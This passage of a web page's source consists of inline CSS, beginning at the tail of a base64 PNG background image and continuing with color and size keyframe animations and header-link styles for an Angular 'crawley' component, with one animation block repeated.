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) 0 0/84px 30px no-repeat
            }
        }
    </style>
<style>
        @-webkit-keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @-webkit-keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }
        }

        @keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @-webkit-keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @-webkit-keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @-webkit-keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @-webkit-keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @-webkit-keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @-webkit-keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @-webkit-keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @-webkit-keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @-webkit-keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @-webkit-keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @-webkit-keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @-webkit-keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @-webkit-keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @-webkit-keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @-webkit-keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @-webkit-keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
                max-height: calc(100vh - 100px)
            }
        }

        @keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
                max-height: calc(100vh - 100px)
            }
        }

        @-webkit-keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        @keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        .crawley[_ngcontent-c11] {
            margin-right: 10px;
            position: relative
        }

        .crawley-content-link-text[_ngcontent-c11] {
            font-size: 14px;
            display: inline-block;
            vertical-align: top;
            padding-top: 2px
        }

        .crawley-content-link[_ngcontent-c11]:hover {
            color: #fff
        }

        .crawley-content[_ngcontent-c11] {
            color: #fff;
            position: relative;
            display: inline-block
        }

        .crawley-content[_ngcontent-c11] i.crawley-content-icon-mobile[_ngcontent-c11] {
            display: none;
            font-size: 19px;
            margin: 0 10px 4px
        }

        .crawley-pipe-left[_ngcontent-c11] {
            width: 1px;
            background: rgba(255, 255, 255, .3);
            height: 17px;
            display: inline-block;
            vertical-align: middle;
            margin-right: 6px;
            color: #fff
        }

        .crawley-pipe-right[_ngcontent-c11] {
            width: 1px;
            background: rgba(255, 255, 255, .3);
            height: 17px;
            display: inline-block;
            vertical-align: middle;
            margin-left: 6px
        }

        .crawley-content-link[_ngcontent-c11] {
            position: relative;
            z-index: 2;
            display: inline-block;
            padding-top: 5px;
            padding-bottom: 6px
        }

        .crawley-content[_ngcontent-c11] i[_ngcontent-c11] {
            display: inline-block;
            margin-left: 6px;
            margin-right: 12px;
            vertical-align: top;
            color: #fff;
            font-size: 12px;
            margin-top: 6px
        }

        .crawley-content.z_index[_ngcontent-c11],
        .crawley.z_index[_ngcontent-c11] {
            z-index: 999
        }

        .crawley-content.z_index[_ngcontent-c11] .crawley-content-link-background[_ngcontent-c11],
        .crawley.z_index[_ngcontent-c11] .crawley-content-link-background[_ngcontent-c11] {
            display: none
        }

        .crawley-content[_ngcontent-c11]:hover {
            cursor: pointer
        }

        @media only screen and (max-width:639px) and (min-width:320px) {
            .crawley[_ngcontent-c11] {
                margin: -1px 14px 0 0;
                padding-top: 7px
            }

            .crawley-content[_ngcontent-c11] {
                padding: 0
            }

            .crawley-content-link-background[_ngcontent-c11] {
                display: none
            }

            .crawley-pipe-left[_ngcontent-c11] {
                margin-right: 2px;
                margin-top: -5px
            }

            .crawley[_ngcontent-c11] .crawley-content-link-text[_ngcontent-c11],
            .crawley[_ngcontent-c11] .crawley-pipe-right[_ngcontent-c11] {
                display: none
            }

            .crawley-content[_ngcontent-c11] i.crawley-content-icon-mobile[_ngcontent-c11] {
                display: inline-block;
                font-family: dinRegular !important;
                font-size: 16px;
                margin: 2px 4px 4px
            }

            .crawley-content[_ngcontent-c11] i.crawley-content-icon-arrow[_ngcontent-c11] {
                margin-left: 0;
                margin-top: 6px
            }
        }

        .crawley[_ngcontent-c11] {
            margin-left: 0
        }

        .crawley-content-link-text[_ngcontent-c11] {
            color: #fff;
            margin-left: 6px;
            text-transform: uppercase
        }

        .crawley-content[_ngcontent-c11]:hover .crawley-content-link-background[_ngcontent-c11] {
            -webkit-animation: .1s crawley-link-animated;
            animation: .1s crawley-link-animated;
            height: 100%;
            top: 0;
            left: 0;
            width: 100%;
            background: rgba(0, 0, 0, .2)
        }

        @-webkit-keyframes crawley-link-animated {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes crawley-link-animated {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        .crawley-content-link-background[_ngcontent-c11] {
            position: absolute;
            width: 80%;
            height: 80%;
            background: 0 0;
            top: 10%;
            left: 10%;
            -webkit-animation: .1s crawley-link-animated-reverse;
            animation: .1s crawley-link-animated-reverse;
            border-radius: 2px
        }

        @-webkit-keyframes crawley-link-animated-reverse {
            0% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }

            100% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }
        }

        @keyframes crawley-link-animated-reverse {
            0% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }

            100% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }
        }

        @media only screen and (max-width:639px) {
            .crawley[_ngcontent-c11] {
                margin: -1px 0 0
            }
        }
    </style>
<style>
        @-webkit-keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @-webkit-keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
